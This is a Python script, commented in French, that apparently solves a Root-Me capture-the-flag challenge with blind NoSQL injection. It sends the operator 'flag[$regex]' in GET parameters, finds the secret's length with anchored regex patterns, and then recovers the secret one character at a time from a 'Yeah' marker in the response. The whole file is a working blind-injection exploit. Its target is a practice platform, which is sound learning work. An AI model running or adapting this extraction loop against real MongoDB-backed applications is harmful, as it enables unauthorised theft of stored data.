import requests
import string
import re

# --- CONFIGURATION ---
url = "http://challenge01.root-me.org/web-serveur/ch48/index.php"
mot_a_trouver = "Yeah"  # Le mot présent dans la page quand c'est VRAI
charset = string.ascii_letters + string.digits + "_{}-?!.,#@" # Caractères à tester

print("--- ETAPE 1 : RECHERCHE DE LA LONGUEUR ---")

longueur_flag = 0

# On teste les longueurs de 1 à 60
for i in range(1, 60):
    # La regex ^.{i}$ veut dire : "Exactement i caractères"
    # Note : En python f-string, il faut doubler les accolades {{ }}
    payload = f"^.{{{i}}}$"
    
    params = {
        "chall_name": "nosqlblind",
        "flag[$regex]": payload
    }
    
    r = requests.get(url, params=params)
    
    if mot_a_trouver in r.text:
        longueur_flag = i
        print(f"[+] SUCCES ! La longueur du flag est : {longueur_flag}")
        break
    else:
        print(f"Test longueur {i}... (non)")

if longueur_flag == 0:
    print("[-] Erreur : Longueur non trouvée. Vérifie le 'mot_a_trouver'.")
    exit()

print("\n--- ETAPE 2 : RECHERCHE DU FLAG ---")

flag = ""

# On boucle autant de fois qu'il y a de caractères (trouvé à l'étape 1)
for i in range(longueur_flag):
    found_char = False
    
    for char in charset:
        # On teste : le flag actuel + le nouveau caractère
        test_flag = flag + char
        
        # re.escape est OBLIGATOIRE pour éviter le bug du "?" ou du "."
        payload = f"^{re.escape(test_flag)}"
        
        params = {
            "chall_name": "nosqlblind",
            "flag[$regex]": payload
        }
        
        r = requests.get(url, params=params)
        
        if mot_a_trouver in r.text:
            flag += char
            print(f"[+] Caractère trouvé ! Flag actuel : {flag}")
            found_char = True
            break # On arrête de chercher pour cette position, on passe à la suivante
            
    if not found_char:
        print("[-] Caractère introuvable dans ta liste (charset) !")
        break

print(f"\n[FIN] Le flag complet est : {flag}")